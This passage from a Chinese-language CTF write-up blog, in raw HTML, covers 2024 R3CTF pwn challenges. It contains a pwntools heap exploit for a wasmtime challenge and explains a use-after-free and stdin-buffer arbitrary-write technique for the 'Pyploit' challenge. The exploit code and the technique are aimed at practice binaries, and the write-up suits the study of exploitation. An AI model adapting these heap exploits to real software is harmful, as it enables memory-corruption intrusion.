class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; ctypes &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; subprocess &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#from LibcSearcher import *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; tty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;debug&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;c = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(c):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p, c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_sb&lt;/span&gt;() : &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;], libc_base + &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data : p.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :p.sendline(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendlineafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;   :p.recv(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text   :p.recvuntil(text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pr = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt; :&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recv(num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inter   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;        :p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l32 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xf7&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l64 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x7f&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu32    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu64    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int16   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(data,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg= &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; s, num   :p.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%s -&amp;gt; 0x%x&amp;#x27;&lt;/span&gt; % (s, num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;, arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;, log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = remote(&amp;#x27;120.46.65.156&amp;#x27;, 32104)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#elf_patch = &amp;#x27;./gostack&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;env = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;WASMTIME_NEW_CLI&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;command = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;./wasmtime&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;--config=./cache.toml&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;--dir=.&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;./chall&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(command, env=env)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#elf = ELF(elf_patch)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;create&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size, data&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;feedback: &amp;#x27;&lt;/span&gt;, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx, data&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;feedback: &amp;#x27;&lt;/span&gt;, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;tui&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;4&amp;#x27;&lt;/span&gt;)		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# w2m_base + 0x14c0 -&amp;gt; heap_ptr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# pro_base + 0x4a05 -&amp;gt; func_ptr[x]();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;script = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;b 123&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(script)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, p32(&lt;span class=&#34;number&#34;&gt;0x14c0&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; + p32(&lt;span class=&#34;number&#34;&gt;0x14c0&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0x424&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0x1228&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0x1228&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;flag.txt\x00\x0a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, p32(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, p32(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tui()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;Pyploit&#34;&gt;&lt;a href=&#34;#Pyploit&#34; class=&#34;headerlink&#34; title=&#34;Pyploit&#34;&gt;&lt;/a&gt;Pyploit&lt;/h2&gt;&lt;p&gt;这道题挺折磨的，有两个 crash， 但是不能利用，能利用的是没法 crash 的洞，利用方式比较困难，在结构体里套结构体的情况下，需要把整个程序完全逆明白才能做出来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/6fe9576dcee2ed57f47e4b43abe3b82e.png&#34; alt=&#34;6fe9576dcee2ed57f47e4b43abe3b82e&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/e0ea61090d4f061af28cc899c3724cb1.png&#34; alt=&#34;e0ea61090d4f061af28cc899c3724cb1&#34;&gt;&lt;/p&gt;
&lt;p&gt;整个程序的功能仅仅是变量赋值和输出变量，其中重点的功能在于存储变量的函数 to_bianlian&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/dded4e64c0f496c3cc0459fb672aa9f9.png&#34; alt=&#34;dded4e64c0f496c3cc0459fb672aa9f9&#34;&gt;&lt;/p&gt;
&lt;p&gt;变量的管理方式是一个链表的形式，在存储变量之前会检测变量是否已经被存储了，如果是，则进入 delete 函数，其中 delete 函数存在 uaf 漏洞&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/af9ab95218f408dee21efbe93247c13e.png&#34; alt=&#34;af9ab95218f408dee21efbe93247c13e&#34;&gt;&lt;/p&gt;
&lt;p&gt;是在检测 – ptr -&amp;gt; num_value 之后，会进入释放代码，但是因为是先提前 – 了，所以导致了，如果在某一次 – ptr -&amp;gt; num_value &amp;#x3D;&amp;#x3D; 0 时候，会进入释放规则，进行变量的释放，但是因为变量的存储方式（作者说是缓存管理），变量在链表中是不会清空的，只会清空结构体上存放了具体数据的堆块指针，如果通过 var &amp;#x3D; var 代码的话，那么 ptr -&amp;gt; num_value 为负数后，可以在变量被释放的清空下，无限触发 – ptr -&amp;gt; num_value ，导致 UAF &lt;/p&gt;
&lt;p&gt;显然要利用的话，需要让 ptr -&amp;gt; num_value 被一个存储变量（ptr） 信息内存指针占用，这样才能够通过 ptr&amp;#x3D;ptr 代码的方式，去 – 任意内存的值。&lt;/p&gt;
&lt;p&gt;到这里就比较麻烦了，可以看到&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/3b8169e07f32c51cb5d102e369da36fc.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;变量存储时候，是可以超过 100 的限制的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/d44f2de5549b1c7ebd16bf986de80905.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;从 find_bl_name 时候的结构体偏移，是可以看出， base -&amp;gt; 0x20 处存储的是变量信息，base + 0x340 处存储的是变量名，那么就可以通过 + - 0x320 来互相对应&lt;/p&gt;
&lt;p&gt;如果只是 100 个变量，那么占用的空间是 0x340 + 100*8 &amp;#x3D; 0x660&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/030cfa7deca290e7d0b61b356cd56d1d.png&#34; alt=&#34;030cfa7deca290e7d0b61b356cd56d1d&#34;&gt;&lt;/p&gt;
&lt;p&gt;从图中可以看到，下半部分也被变量填充了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/3c1e2cb38b11628c37be644b99568eb1.png&#34; alt=&#34;3c1e2cb38b11628c37be644b99568eb1&#34;&gt;&lt;/p&gt;
&lt;p&gt;在下面的内存中，可以看到，这部分内存是存放的变量信息，也就是 bl_list_top -&amp;gt; ptr[i] 指向的地方&lt;/p&gt;
&lt;p&gt;其中，在申请新变量存储空间的函数中&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/d6203e0e69e755c3fe0335fcb9016242.png&#34; alt=&#34;d6203e0e69e755c3fe0335fcb9016242&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果满了，会调用 new_mmap 函数来申请新空间&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/3d253b99d41105425b7fef069d355acd.png&#34; alt=&#34;3d253b99d41105425b7fef069d355acd&#34;&gt;&lt;/p&gt;
&lt;p&gt;主要是从 free_mmap 取出，或者新 mmap 一段&lt;/p&gt;
&lt;p&gt;当我们这么分配时候&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;debug(&lt;span class=&#34;string&#34;&gt;&amp;#x27;b *$rebase(0x14d9)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	scm(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;dummy&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt; = 3735928559&amp;#x27;&lt;/span&gt;.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	scm(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;dummy&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt;=dummy&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(&amp;#x27;b *$rebase(0x19a6)\nb *$rebase(0x1d96)\n&amp;#x27; + &amp;#x27;c\n&amp;#x27;*200)	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;会将存储 bl_list_top -&amp;gt; ptr[i] 那一段内存放入 free_mmap 中（这里我也没逆太懂分配规则，不是很想去深挖了）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/8324faea703573d285eb7dfb05d077a5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;这就导致再接着申请变量时候， new_bl_list_top -&amp;gt; ptr 会覆盖 old_bl_list_top -&amp;gt; ptr ，这样，就可以通过 old_var &amp;#x3D; old_var 无限触发 – old_bl_list_top -&amp;gt; ptr -&amp;gt; num_value ，修改 new_bl_list_top -&amp;gt; ptr  为目标内存地址，再通过 new_var &amp;#x3D; new_var，无限触发  – new_bl_list_top -&amp;gt; ptr -&amp;gt; num_value，实现内存修改。&lt;/p&gt;
&lt;p&gt;这里是攻击 &lt;em&gt;IO_2_1_stdin&lt;/em&gt; 的 _IO_buf_base 通过 exit 功能的 getchar 函数进行任意地址写，可参考 Nullullullllu&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span 